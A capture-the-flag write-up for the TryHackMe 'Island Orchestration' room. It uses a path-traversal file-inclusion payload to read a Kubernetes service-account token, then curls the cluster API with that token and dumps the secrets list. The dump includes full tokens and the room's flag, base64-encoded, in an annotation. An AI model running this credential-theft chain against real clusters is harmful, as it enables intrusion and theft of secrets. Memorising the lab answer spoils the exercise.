[TryHackMe | Island Orchestration](https://tryhackme.com/room/islandorchestration)

# TryHackMe-Island-Orchestration
`Island Orchestration - Looking for the next holiday destination? Look no further than the Islands of Orchestration.`

![image](https://user-images.githubusercontent.com/58542375/175810404-91b6a7ee-d1ae-468d-83f4-8a93c34d7641.png)

http://10.10.199.122/?page=../../../../../etc/hostname
`islands-7655b7749f-zvq52`

![image](https://user-images.githubusercontent.com/58542375/175810529-994d78fc-1191-4c49-96b7-c20833018a3d.png)

[LFI/RFI - Pentest Book](https://pentestbook.six2dez.com/enumeration/web/lfi-rfi)

`http://10.10.199.122/?page=../../../../../var/run/secrets/kubernetes.io/serviceaccount`

![image](https://user-images.githubusercontent.com/58542375/175810742-1e45cbef-1ec3-4b6a-9872-60a2b92165ca.png)

```
root@ip-10-10-75-197:~# ffuf -u http://10.10.199.122/?page=../../../../../var/run/secrets/kubernetes.io/serviceaccount/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -fw 1126

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.199.122/?page=../../../../../var/run/secrets/kubernetes.io/serviceaccount/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response words: 1126
________________________________________________

lost+found              [Status: 200, Size: 3369, Words: 1127, Lines: 107]
token                   [Status: 200, Size: 4227, Words: 1117, Lines: 107]
:: Progress: [20473/20473] :: Job [1/1] :: 2692 req/sec :: Duration: [0:00:06] :: Errors: 0 ::
root@ip-10-10-75-197:~# 
```

![image](https://user-images.githubusercontent.com/58542375/175811058-bff718c2-ab26-4210-b460-a8a857c8e775.png)

![image](https://user-images.githubusercontent.com/58542375/175811152-a130aec5-02cd-4cd7-9580-90e9c5b88344.png)

[JSON Web Tokens - jwt.io](https://jwt.io/)

[Kubernetes Pentest Methodology Part 3](https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-3)

`curl -v -H “Authorization: Bearer <jwt_token>” https://<master_ip>:<port>/api/v1/namespaces/default/pods/`

`curl -k -v -H "Authorization: Bearer $TOKEN" https://10.10.199.122:8443/api/v1/namespaces/default/pods/`

```
root@ip-10-10-75-197:~# curl -k -v -H "Authorization: Bearer $TOKEN" https://10.10.199.122:8443/api/v1/namespaces/default/pods/
*   Trying 10.10.199.122...
* TCP_NODELAY set
* Connected to 10.10.199.122 (10.10.199.122) port 8443 (#0)
* ALPN, offering h2
* ALPN, offering http/1.1
* successfully set certificate verify locations:
*   CAfile: /etc/ssl/certs/ca-certificates.crt
  CApath: /etc/ssl/certs
* TLSv1.3 (OUT), TLS handshake, Client hello (1):
* TLSv1.3 (IN), TLS handshake, Server hello (2):
* TLSv1.3 (IN), TLS Unknown, Certificate Status (22):
* TLSv1.3 (IN), TLS handshake, Unknown (8):
* TLSv1.3 (IN), TLS Unknown, Certificate Status (22):
* TLSv1.3 (IN), TLS handshake, Request CERT (13):
* TLSv1.3 (IN), TLS Unknown, Certificate Status (22):
* TLSv1.3 (IN), TLS handshake, Certificate (11):
* TLSv1.3 (IN), TLS Unknown, Certificate Status (22):
* TLSv1.3 (IN), TLS handshake, CERT verify (15):
* TLSv1.3 (IN), TLS Unknown, Certificate Status (22):
* TLSv1.3 (IN), TLS handshake, Finished (20):
* TLSv1.3 (OUT), TLS change cipher, Client hello (1):
* TLSv1.3 (OUT), TLS Unknown, Certificate Status (22):
* TLSv1.3 (OUT), TLS handshake, Certificate (11):
* TLSv1.3 (OUT), TLS Unknown, Certificate Status (22):
* TLSv1.3 (OUT), TLS handshake, Finished (20):
* SSL connection using TLSv1.3 / TLS_AES_256_GCM_SHA384
* ALPN, server accepted to use h2
* Server certificate:
*  subject: O=system:masters; CN=minikube
*  start date: Jan  5 23:39:08 2022 GMT
*  expire date: Jan  5 23:39:08 2025 GMT
*  issuer: CN=minikubeCA
*  SSL certificate verify result: unable to get local issuer certificate (20), continuing anyway.
* Using HTTP2, server supports multi-use
* Connection state changed (HTTP/2 confirmed)
* Copying HTTP/2 data in stream buffer to connection buffer after upgrade: len=0
* TLSv1.3 (OUT), TLS Unknown, Unknown (23):
* TLSv1.3 (OUT), TLS Unknown, Unknown (23):
* TLSv1.3 (OUT), TLS Unknown, Unknown (23):
* Using Stream ID: 1 (easy handle 0x55eaf5ce7580)
* TLSv1.3 (OUT), TLS Unknown, Unknown (23):
> GET /api/v1/namespaces/default/pods/ HTTP/2
> Host: 10.10.199.122:8443
> User-Agent: curl/7.58.0
> Accept: */*
> Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Im82QU1WNV9qNEIwYlV3YnBGb1NXQ25UeUtmVzNZZXZQZjhPZUtUb21jcjQifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjg3Nzc1NjIxLCJpYXQiOjE2NTYyMzk2MjEsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJpc2xhbmRzLTc2NTViNzc0OWYtenZxNTIiLCJ1aWQiOiJiMzEwNjkyMS00OTBhLTQ3NjctOGQ1OS03MmY2NjkxYmY5YzAifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6ImlzbGFuZHMiLCJ1aWQiOiI5OTIzOTA1OS00ZjZjLTQwNmItODI5NC01YTU1ZmJjMTQzYjAifSwid2FybmFmdGVyIjoxNjU2MjQzMjI4fSwibmJmIjoxNjU2MjM5NjIxLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6ZGVmYXVsdDppc2xhbmRzIn0.BAvkWNgOHfcjCGLu6g2hNpgfy8mBu2pBL_HZZohmO3IuBhuTIxqCB-jfYWBXzNHsEzYlnqqsGKPCsiOfL9uEz9LRCeVHL-4nCtAHgd4ZpB8DS_dNSAs_dLJJrB5auccCiqOphr75l0uHXC0JSEgfLWgAtSXLUqcEQQsSfXaLMWVtEWt62O22eIJimB4bn4Fchg0m8f4-B_cQzk2ZkDSix5hmseIAb-304Nv10IjdZZznHiscG3M1eNcCb6MldqwFaTQ_1PLBKQIE4_5Po6sHR8SrMVz5y9mU00rSB5vDIayWKEwxBwwsaTDH53bdzLfty08feqr4GxsnxXLEjhgQMg
> 
* TLSv1.3 (IN), TLS Unknown, Certificate Status (22):
* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
* TLSv1.3 (IN), TLS Unknown, Unknown (23):
* Connection state changed (MAX_CONCURRENT_STREAMS updated)!
* TLSv1.3 (OUT), TLS Unknown, Unknown (23):
* TLSv1.3 (IN), TLS Unknown, Unknown (23):
* TLSv1.3 (IN), TLS Unknown, Unknown (23):
< HTTP/2 403 
< audit-id: 0a4e3018-20e7-4fd2-a697-49bb8b5ae4f1
< cache-control: no-cache, private
< content-type: application/json
< x-content-type-options: nosniff
< x-kubernetes-pf-flowschema-uid: 31e0e266-992e-4fe4-9dbd-eba238837779
< x-kubernetes-pf-prioritylevel-uid: 1feedeb5-1685-4004-b35b-317b68e1e5b2
< content-length: 331
< date: Sun, 26 Jun 2022 11:17:49 GMT
< 
* TLSv1.3 (IN), TLS Unknown, Unknown (23):
{
  "kind": "Status",
  "apiVersion": "v1",
  "metadata": {
    
  },
  "status": "Failure",
  "message": "pods is forbidden: User \"system:serviceaccount:default:islands\" cannot list resource \"pods\" in API group \"\" in the namespace \"default\"",
  "reason": "Forbidden",
  "details": {
    "kind": "pods"
  },
  "code": 403
* Connection #0 to host 10.10.199.122 left intact
}root@ip-10-10-75-197:~# 
```

```
root@ip-10-10-75-197:~# curl -k -v -H "Authorization: Bearer $TOKEN" https://10.10.199.122:8443/api/v1/namespaces/default/secrets
*   Trying 10.10.199.122...
* TCP_NODELAY set
* Connected to 10.10.199.122 (10.10.199.122) port 8443 (#0)
* ALPN, offering h2
* ALPN, offering http/1.1
* successfully set certificate verify locations:
*   CAfile: /etc/ssl/certs/ca-certificates.crt
  CApath: /etc/ssl/certs
* TLSv1.3 (OUT), TLS handshake, Client hello (1):
* TLSv1.3 (IN), TLS handshake, Server hello (2):
* TLSv1.3 (IN), TLS Unknown, Certificate Status (22):
* TLSv1.3 (IN), TLS handshake, Unknown (8):
* TLSv1.3 (IN), TLS Unknown, Certificate Status (22):
* TLSv1.3 (IN), TLS handshake, Request CERT (13):
* TLSv1.3 (IN), TLS Unknown, Certificate Status (22):
* TLSv1.3 (IN), TLS handshake, Certificate (11):
* TLSv1.3 (IN), TLS Unknown, Certificate Status (22):
* TLSv1.3 (IN), TLS handshake, CERT verify (15):
* TLSv1.3 (IN), TLS Unknown, Certificate Status (22):
* TLSv1.3 (IN), TLS handshake, Finished (20):
* TLSv1.3 (OUT), TLS change cipher, Client hello (1):
* TLSv1.3 (OUT), TLS Unknown, Certificate Status (22):
* TLSv1.3 (OUT), TLS handshake, Certificate (11):
* TLSv1.3 (OUT), TLS Unknown, Certificate Status (22):
* TLSv1.3 (OUT), TLS handshake, Finished (20):
* SSL connection using TLSv1.3 / TLS_AES_256_GCM_SHA384
* ALPN, server accepted to use h2
* Server certificate:
*  subject: O=system:masters; CN=minikube
*  start date: Jan  5 23:39:08 2022 GMT
*  expire date: Jan  5 23:39:08 2025 GMT
*  issuer: CN=minikubeCA
*  SSL certificate verify result: unable to get local issuer certificate (20), continuing anyway.
* Using HTTP2, server supports multi-use
* Connection state changed (HTTP/2 confirmed)
* Copying HTTP/2 data in stream buffer to connection buffer after upgrade: len=0
* TLSv1.3 (OUT), TLS Unknown, Unknown (23):
* TLSv1.3 (OUT), TLS Unknown, Unknown (23):
* TLSv1.3 (OUT), TLS Unknown, Unknown (23):
* Using Stream ID: 1 (easy handle 0x55df04697580)
* TLSv1.3 (OUT), TLS Unknown, Unknown (23):
> GET /api/v1/namespaces/default/secrets HTTP/2
> Host: 10.10.199.122:8443
> User-Agent: curl/7.58.0
> Accept: */*
> Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Im82QU1WNV9qNEIwYlV3YnBGb1NXQ25UeUtmVzNZZXZQZjhPZUtUb21jcjQifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjg3Nzc1NjIxLCJpYXQiOjE2NTYyMzk2MjEsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJpc2xhbmRzLTc2NTViNzc0OWYtenZxNTIiLCJ1aWQiOiJiMzEwNjkyMS00OTBhLTQ3NjctOGQ1OS03MmY2NjkxYmY5YzAifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6ImlzbGFuZHMiLCJ1aWQiOiI5OTIzOTA1OS00ZjZjLTQwNmItODI5NC01YTU1ZmJjMTQzYjAifSwid2FybmFmdGVyIjoxNjU2MjQzMjI4fSwibmJmIjoxNjU2MjM5NjIxLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6ZGVmYXVsdDppc2xhbmRzIn0.BAvkWNgOHfcjCGLu6g2hNpgfy8mBu2pBL_HZZohmO3IuBhuTIxqCB-jfYWBXzNHsEzYlnqqsGKPCsiOfL9uEz9LRCeVHL-4nCtAHgd4ZpB8DS_dNSAs_dLJJrB5auccCiqOphr75l0uHXC0JSEgfLWgAtSXLUqcEQQsSfXaLMWVtEWt62O22eIJimB4bn4Fchg0m8f4-B_cQzk2ZkDSix5hmseIAb-304Nv10IjdZZznHiscG3M1eNcCb6MldqwFaTQ_1PLBKQIE4_5Po6sHR8SrMVz5y9mU00rSB5vDIayWKEwxBwwsaTDH53bdzLfty08feqr4GxsnxXLEjhgQMg
> 
* TLSv1.3 (IN), TLS Unknown, Certificate Status (22):
* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
* TLSv1.3 (IN), TLS Unknown, Unknown (23):
* Connection state changed (MAX_CONCURRENT_STREAMS updated)!
* TLSv1.3 (OUT), TLS Unknown, Unknown (23):
* TLSv1.3 (IN), TLS Unknown, Unknown (23):
* TLSv1.3 (IN), TLS Unknown, Unknown (23):
* TLSv1.3 (IN), TLS Unknown, Unknown (23):
< HTTP/2 200 
< audit-id: 594588ff-c94b-4e33-aa90-b4123f7e843f
< cache-control: no-cache, private
< content-type: application/json
< x-kubernetes-pf-flowschema-uid: 31e0e266-992e-4fe4-9dbd-eba238837779
< x-kubernetes-pf-prioritylevel-uid: 1feedeb5-1685-4004-b35b-317b68e1e5b2
< date: Sun, 26 Jun 2022 11:19:30 GMT
< 
* TLSv1.3 (IN), TLS Unknown, Unknown (23):
{
  "kind": "SecretList",
  "apiVersion": "v1",
  "metadata": {
    "resourceVersion": "16238"
  },
  "items": [
    {
      "metadata": {
        "name": "default-token-8bksk",
        "namespace": "default",
        "uid": "62c2aa8a-3e0d-4e43-a846-dd3bc9e88fe7",
        "resourceVersion": "405",
        "creationTimestamp": "2022-01-06T23:39:33Z",
        "annotations": {
          "kubernetes.io/service-account.name": "default",
          "kubernetes.io/service-account.uid": "5761c0a4-8b32-4f4c-ba21-8172cb7c0770"
        },
        "managedFields": [
          {
            "manager": "kube-controller-manager",
            "operation": "Update",
            "apiVersion": "v1",
            "time": "2022-01-06T23:39:33Z",
            "fieldsType": "FieldsV1",
            "fieldsV1": {"f:data":{".":{},"f:ca.crt":{},"f:namespace":{},"f:token":{}},"f:metadata":{"f:annotations":{".":{},"f:kubernetes.io/service-account.name":{},"f:kubernetes.io/service-account.uid":{}}},"f:type":{}}
          }
        ]
      },
      "data": {
        "ca.crt": "LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSURCakNDQWU2Z0F3SUJBZ0lCQVRBTkJna3Foa2lHOXcwQkFRc0ZBREFWTVJNd0VRWURWUVFERXdwdGFXNXAKYTNWaVpVTkJNQjRYRFRJeU1ERXdOVEl3TVRneU0xb1hEVE15TURFd05ESXdNVGd5TTFvd0ZURVRNQkVHQTFVRQpBeE1LYldsdWFXdDFZbVZEUVRDQ0FTSXdEUVlKS29aSWh2Y05BUUVCQlFBRGdnRVBBRENDQVFvQ2dnRUJBTjFUCll6Z3NPbGJvWVAzd3hXKzliMGRUMlhoU3FDSkFrNEQvSVZ4RkMvc1ZCVGYxbWVQYXFTUnllSXNHWTFUaU96WTEKVDFWMENNYXZES1doYUc4U2RuUmJQVC9wRG9WTEt2K0hGZ3B1cmg1bThuVEpvRUlRSXJNMzB6R3p3UStzVk1aSgplNUlxcWZhSHc3ZUJWQldmZXg1d210SjFCaEtEVUpsRzRjTnJFRGkrejI5cUQ4T1pWUXh1S3NZdHZ5bTg3U1pBClVaZjZoYnNVcUlYaFA2bTFET0pHclRyMGhFeTZDc2ZDbTc4REg2b1p0cEx6TXRSU1AxZ1lEdTZLcnB5ZU9XejMKNGpkS1grQ1JtcHJwLzk1SlNKUGJaOWx1WXBkQ2pnekFLWmtXS2dhUG5HcG9PNlRaclR3YWNqdnUwcVRGazhjcQpBeHpCa0gwaHVzcFJHREVJVWhjQ0F3RUFBYU5oTUY4d0RnWURWUjBQQVFIL0JBUURBZ0trTUIwR0ExVWRKUVFXCk1CUUdDQ3NHQVFVRkJ3TUNCZ2dyQmdFRkJRY0RBVEFQQmdOVkhSTUJBZjhFQlRBREFRSC9NQjBHQTFVZERnUVcKQkJUd0NqOVQ1ZjV2T1FySGtBSjAxTjUraFlNdUVEQU5CZ2txaGtpRzl3MEJBUXNGQUFPQ0FRRUFiN0k0bDhMUQorK1h5K0Rjdmo4WVc5R2VuVTNXNzZubzlZYkFUSy9OdHFPZW1ydTIxSTh5RDQyeDEyVVo3eENvdm41ZWExTUNnCnRQOHkrb1NBUWRvT3Q4Sk8yR3JELzd4eTY0eWZMSjVocVlVaUp6NkJDT0YxNTc2a1FaSTBKd0I2WENYU1pTd2gKSnc4ZGNyc09NUXN4T2Y2UWRveVoyek5VQ2tuTW0zaHBVRUY4eHdRbVdMN3VvK0MwRUdwU0p2bE9LSFZiWmgzZQpTR0t2enZrN0dTS1RKRjVGZ0k0RzhYNS9KVm1EZE45TWsza2w4UEtGTlA2U0dBSVdvbEZNc0E5aUN4b3UxQXBhCjV6ZktYOTE4Ym5OcUttREZJSk9kamFkdk9sOG9OY0NnMUdhQTRodE9WK3NGazN6eENOTkdXM2krYzk3SjFFUW0KVmVCbEhMaStXK2d0SHc9PQotLS0tLUVORCBDRVJUSUZJQ0FURS0tLS0tCg==",
        "namespace": "ZGVmYXVsdA==",
        "token": "ZXlKaGJHY2lPaUpTVXpJMU5pSXNJbXRwWkNJNkltODJRVTFXTlY5cU5FSXdZbFYzWW5CR2IxTlhRMjVVZVV0bVZ6TlpaWFpRWmpoUFpVdFViMjFqY2pRaWZRLmV5SnBjM01pT2lKcmRXSmxjbTVsZEdWekwzTmxjblpwWTJWaFkyTnZkVzUwSWl3aWEzVmlaWEp1WlhSbGN5NXBieTl6WlhKMmFXTmxZV05qYjNWdWRDOXVZVzFsYzNCaFkyVWlPaUprWldaaGRXeDBJaXdpYTNWaVpYSnVaWFJsY3k1cGJ5OXpaWEoyYVdObFlXTmpiM1Z1ZEM5elpXTnlaWFF1Ym1GdFpTSTZJbVJsWm1GMWJIUXRkRzlyWlc0dE9HSnJjMnNpTENKcmRXSmxjbTVsZEdWekxtbHZMM05sY25acFkyVmhZMk52ZFc1MEwzTmxjblpwWTJVdFlXTmpiM1Z1ZEM1dVlXMWxJam9pWkdWbVlYVnNkQ0lzSW10MVltVnlibVYwWlhNdWFXOHZjMlZ5ZG1salpXRmpZMjkxYm5RdmMyVnlkbWxqWlMxaFkyTnZkVzUwTG5WcFpDSTZJalUzTmpGak1HRTBMVGhpTXpJdE5HWTBZeTFpWVRJeExUZ3hOekpqWWpkak1EYzNNQ0lzSW5OMVlpSTZJbk41YzNSbGJUcHpaWEoyYVdObFlXTmpiM1Z1ZERwa1pXWmhkV3gwT21SbFptRjFiSFFpZlEuVHprTmpqMWhyV2lrT0tQR1d5bnUwZ3Nmc3hOYUZiSnd6aWVDREZBeVNmeTJqX0hKbUhQT0pYdEJkYU1JdEtVVDRDLW9SNDZpU0VvRGluSDNlend3OW9yZEZzVXBZalV1RU9uTGJ3QWFLOUlTdGRRd2oxaHhXTGdQVC1SNkdKVE9VQXpnUGVXcFpFM0JIT1dqaHpCMU8zREMxR0sxd1poaG5WSFFvV2loS1lQcWRGY0pLZmlWaHVsTzFOMFhXTFVJU2RPeXlCMFZYWFJTbEZOTWw3XzFNcmJzSFJDc2xJQVk1V3cwVTVVSVhKZVEtdGlWZ2EzNGlCVm15RF9RV2Y4UTJvWVBTRHB5OHhjQWpZMFRDNTdDWl9SenhSckFsZnhwV244azVqVWNzdnhOaFZzQVNaSXg4Mms0aWVwbTF2WVZyblZNQ0dlSUNjVGVuQ0dQWl9ZVFJn"
      },
      "type": "kubernetes.io/service-account-token"
    },
    {
      "metadata": {
        "name": "flag",
        "namespace": "default",
        "uid": "750ac081-742f-4594-a6f4-8fa3e1bbceb7",
        "resourceVersion": "7072",
        "creationTimestamp": "2022-03-02T19:47:07Z",
        "annotations": {
          "kubectl.kubernetes.io/last-applied-configuration": "{\"apiVersion\":\"v1\",\"data\":{\"flag\":\"ZmxhZ3swOGJlZDlmYzBiYzZkOTRmZmY5ZTUxZjI5MTU3Nzg0MX0=\"},\"kind\":\"Secret\",\"metadata\":{\"annotations\":{},\"name\":\"flag\",\"namespace\":\"default\"},\"type\":\"Opaque\"}\n"
        },
        "managedFields": [
          {
            "manager": "kubectl-client-side-apply",
            "operation": "Update",
            "apiVersion": "v1",
            "time": "2022-03-02T19:47:07Z",
            "fieldsType": "FieldsV1",
            "fieldsV1": {"f:data":{".":{},"f:flag":{}},"f:metadata":{"f:annotations":{".":{},"f:kubectl.kubernetes.io/last-applied-configuration":{}}},"f:type":{}}
          }
        ]
      },
      "data": {
        "flag": "ZmxhZ3**REDACTED**0MX0="
      },
      "type": "Opaque"
    },
    {
      "metadata": {
        "name": "islands-token-dtrnt",
        "namespace": "default",
        "uid": "60e8a591-d987-4223-93b3-5dda70486403",
        "resourceVersion": "7062",
        "creationTimestamp": "2022-03-02T19:47:07Z",
        "annotations": {
          "kubernetes.io/service-account.name": "islands",
          "kubernetes.io/service-account.uid": "99239059-4f6c-406b-8294-5a55fbc143b0"
        },
        "managedFields": [
          {
            "manager": "kube-controller-manager",
            "operation": "Update",
            "apiVersion": "v1",
            "time": "2022-03-02T19:47:07Z",
            "fieldsType": "FieldsV1",
            "fieldsV1": {"f:data":{".":{},"f:ca.crt":{},"f:namespace":{},"f:token":{}},"f:metadata":{"f:annotations":{".":{},"f:kubernetes.io/service-account.name":{},"f:kubernetes.io/service-account.uid":{}}},"f:type":{}}
          }
        ]
      },
      "data": {
* TLSv1.3 (IN), TLS Unknown, Unknown (23):
        "ca.crt": "LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSURCakNDQWU2Z0F3SUJBZ0lCQVRBTkJna3Foa2lHOXcwQkFRc0ZBREFWTVJNd0VRWURWUVFERXdwdGFXNXAKYTNWaVpVTkJNQjRYRFRJeU1ERXdOVEl3TVRneU0xb1hEVE15TURFd05ESXdNVGd5TTFvd0ZURVRNQkVHQTFVRQpBeE1LYldsdWFXdDFZbVZEUVRDQ0FTSXdEUVlKS29aSWh2Y05BUUVCQlFBRGdnRVBBRENDQVFvQ2dnRUJBTjFUCll6Z3NPbGJvWVAzd3hXKzliMGRUMlhoU3FDSkFrNEQvSVZ4RkMvc1ZCVGYxbWVQYXFTUnllSXNHWTFUaU96WTEKVDFWMENNYXZES1doYUc4U2RuUmJQVC9wRG9WTEt2K0hGZ3B1cmg1bThuVEpvRUlRSXJNMzB6R3p3UStzVk1aSgplNUlxcWZhSHc3ZUJWQldmZXg1d210SjFCaEtEVUpsRzRjTnJFRGkrejI5cUQ4T1pWUXh1S3NZdHZ5bTg3U1pBClVaZjZoYnNVcUlYaFA2bTFET0pHclRyMGhFeTZDc2ZDbTc4REg2b1p0cEx6TXRSU1AxZ1lEdTZLcnB5ZU9XejMKNGpkS1grQ1JtcHJwLzk1SlNKUGJaOWx1WXBkQ2pnekFLWmtXS2dhUG5HcG9PNlRaclR3YWNqdnUwcVRGazhjcQpBeHpCa0gwaHVzcFJHREVJVWhjQ0F3RUFBYU5oTUY4d0RnWURWUjBQQVFIL0JBUURBZ0trTUIwR0ExVWRKUVFXCk1CUUdDQ3NHQVFVRkJ3TUNCZ2dyQmdFRkJRY0RBVEFQQmdOVkhSTUJBZjhFQlRBREFRSC9NQjBHQTFVZERnUVcKQkJUd0NqOVQ1ZjV2T1FySGtBSjAxTjUraFlNdUVEQU5CZ2txaGtpRzl3MEJBUXNGQUFPQ0FRRUFiN0k0bDhMUQorK1h5K0Rjdmo4WVc5R2VuVTNXNzZubzlZYkFUSy9OdHFPZW1ydTIxSTh5RDQyeDEyVVo3eENvdm41ZWExTUNnCnRQOHkrb1NBUWRvT3Q4Sk8yR3JELzd4eTY0eWZMSjVocVlVaUp6NkJDT0YxNTc2a1FaSTBKd0I2WENYU1pTd2gKSnc4ZGNyc09NUXN4T2Y2UWRveVoyek5VQ2tuTW0zaHBVRUY4eHdRbVdMN3VvK0MwRUdwU0p2bE9LSFZiWmgzZQpTR0t2enZrN0dTS1RKRjVGZ0k0RzhYNS9KVm1EZE45TWsza2w4UEtGTlA2U0dBSVdvbEZNc0E5aUN4b3UxQXBhCjV6ZktYOTE4Ym5OcUttREZJSk9kamFkdk9sOG9OY0NnMUdhQTRodE9WK3NGazN6eENOTkdXM2krYzk3SjFFUW0KVmVCbEhMaStXK2d0SHc9PQotLS0tLUVORCBDRVJUSUZJQ0FURS0tLS0tCg==",
        "namespace": "ZGVmYXVsdA==",
        "token": "ZXlKaGJHY2lPaUpTVXpJMU5pSXNJbXRwWkNJNkltODJRVTFXTlY5cU5FSXdZbFYzWW5CR2IxTlhRMjVVZVV0bVZ6TlpaWFpRWmpoUFpVdFViMjFqY2pRaWZRLmV5SnBjM01pT2lKcmRXSmxjbTVsZEdWekwzTmxjblpwWTJWaFkyTnZkVzUwSWl3aWEzVmlaWEp1WlhSbGN5NXBieTl6WlhKMmFXTmxZV05qYjNWdWRDOXVZVzFsYzNCaFkyVWlPaUprWldaaGRXeDBJaXdpYTNWaVpYSnVaWFJsY3k1cGJ5OXpaWEoyYVdObFlXTmpiM1Z1ZEM5elpXTnlaWFF1Ym1GdFpTSTZJbWx6YkdGdVpITXRkRzlyWlc0dFpIUnliblFpTENKcmRXSmxjbTVsZEdWekxtbHZMM05sY25acFkyVmhZMk52ZFc1MEwzTmxjblpwWTJVdFlXTmpiM1Z1ZEM1dVlXMWxJam9pYVhOc1lXNWtjeUlzSW10MVltVnlibVYwWlhNdWFXOHZjMlZ5ZG1salpXRmpZMjkxYm5RdmMyVnlkbWxqWlMxaFkyTnZkVzUwTG5WcFpDSTZJams1TWpNNU1EVTVMVFJtTm1NdE5EQTJZaTA0TWprMExUVmhOVFZtWW1NeE5ETmlNQ0lzSW5OMVlpSTZJbk41YzNSbGJUcHpaWEoyYVdObFlXTmpiM1Z1ZERwa1pXWmhkV3gwT21semJHRnVaSE1pZlEuTWNjODlGWkVGcy0xa1RqckltRmFPeE82TmE4YnVwQmdieW90WHVYLThCUjZHanowTjc1VExxVUlfSGZweHZIYnlLa1p2WXl6NDF1NVgwc1phdU84bjdZSTNxRGRmbjFYMjhkNmVuOGpwSHhaS1hmQjBkaEU5RTZjcEpCUUlUWDZJa1Z5NTRxbnBHTngxQXpHbFNFRmluQXNaelhoTmp4bjljQTE2M25oWnVJdHpZZ29IN3NVU0p0b2NjU2dMSzNOZHhCWTlEd1dmRFlRcWplLVJVdFZKSEs2cnNSMmk4RGhURGNZd2ZCOEg5WEc1aW9Wanc0WGhFb2xDRjcwRlgzOWlVcFNubHdtTEV2NTRQZ2RfaDNMUlUtN0NaLXd6TFFneHN2VExORWNwZUN3VTFmN2VnSHZzVFdzbUhIVkJFNTRWdnV5ZHQwRTJab3ZBSGYzU0dPTC1B"
      },
      "type": "kubernetes.io/service-account-token"
    }
  ]
* TLSv1.3 (IN), TLS Unknown, Unknown (23):
* Connection #0 to host 10.10.199.122 left intact
}root@ip-10-10-75-197:~# 
```

![image](https://user-images.githubusercontent.com/58542375/175811868-16ae7018-5a8e-46e3-9865-f35d2ac60e13.png)

![image](https://user-images.githubusercontent.com/58542375/175811733-57817e84-25fc-4501-8186-9ac5f2eadb89.png)

Thank you [Djemouai Mohamed Abdou](https://www.youtube.com/watch?v=Vj4PvvtCA1c) for this walkthrough...
